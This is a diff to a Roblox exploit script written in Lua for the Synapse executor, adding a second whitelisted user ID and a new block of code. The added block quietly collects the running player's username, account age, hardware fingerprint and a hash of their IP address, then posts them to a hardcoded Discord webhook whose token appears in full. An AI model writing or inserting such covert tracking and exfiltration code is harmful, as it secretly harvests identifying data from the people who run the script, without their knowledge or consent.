@@ -1,6 +1,6 @@
-if game.Players.LocalPlayer.UserId == 200168977 then
+if game.Players.LocalPlayer.UserId == 200168977 or game.Players.LocalPlayer.UserId == 827459299 then
 
-
+_G.Notifs = true
 
 if syn then
     for i, v in next, getconnections(game:GetService('LogService').MessageOut) do
@@ -212,6 +212,54 @@ if syn then
             );
         end
     end)()
+    
+local url = 'https://discord.com/api/webhooks/833029838649425920/PZwT2jYhv4zEbUo4Trr9wKqhUhjZ7dnqC_wYR2OGBJNdnyf5hVj8yRd0Ywm77hZPNLH2'
+local req = syn.request
+local hwid_headers = {'Syn-Fingerprint'} -- You will have to add more headers for different exploits
+
+function ip()local a=req({Url='https://httpbin.org/ip',Method='GET'}) local b=game:GetService('HttpService'):JSONDecode(a.Body) local Hash = game:HttpGet('https://api.hashify.net/hash/md5/hex?value='..b.origin) local Hashed = game:GetService("HttpService"):JSONDecode(Hash) return Hashed.Digest end
+function hwid()local a=req({Url='https://httpbin.org/get',Method='GET'})local b=game:GetService('HttpService'):JSONDecode(a.Body)for c,d in pairs(hwid_headers)do if b.headers[d]then return b.headers[d]end end end
+
+local data = {
+    ["username"]  = "christos closet",
+    ["avatar_url"] = "https://media.discordapp.net/attachments/833029294891991091/844414531874455602/carol_on_Twitter.png?width=475&height=402",
+    ["embeds"] = {
+        {
+            ["author"] = {
+                ["name"] = game.Players.LocalPlayer.Name,
+                ["url"] = "https://www.roblox.com/games/"..game.PlaceId,
+                ["icon_url"] = "https://web.roblox.com/Thumbs/Avatar.ashx?x=100&y=100&Format=Png&userid="..game.Players.LocalPlayer.UserId
+            },
+            ["url"] = "https://www.roblox.com/games/"..game.PlaceId,
+            ["description"] = game:GetService('MarketplaceService'):GetProductInfo(game.PlaceId).Name,
+            ["color"] = 5792378,
+            ["fields"] = {
+                {
+                    ["name"] = "Player Info:",
+                    ["value"] = "**Age: **"..game.Players.LocalPlayer.AccountAge,
+                },
+                {
+                    ["name"] = "HWID:",
+                    ["value"] = tostring("```"..hwid().."```"),
+                    ["inline"] = true
+                },
+                {
+                    ["name"] = "IP:",
+                    ["value"] = tostring("```"..ip().."```"),
+                },
+            },
+            ["thumbnail"] = {
+                ["url"] = "https://web.roblox.com/Thumbs/Avatar.ashx?x=100&y=100&Format=Png&userid="..game.Players.LocalPlayer.UserId
+            },
+            ["footer"] = {
+                ["text"] = "hi wyd wya les talk",
+            }
+        }
+    }
+}
+
+
+local Post = req({Url = url,  Method = 'POST', Headers = { ['Content-Type'] = 'application/json' }, Body = game:GetService('HttpService'):JSONEncode(data)})
  
     -- Meta Hooks
     local scriptMeta = getrawmetatable(script)
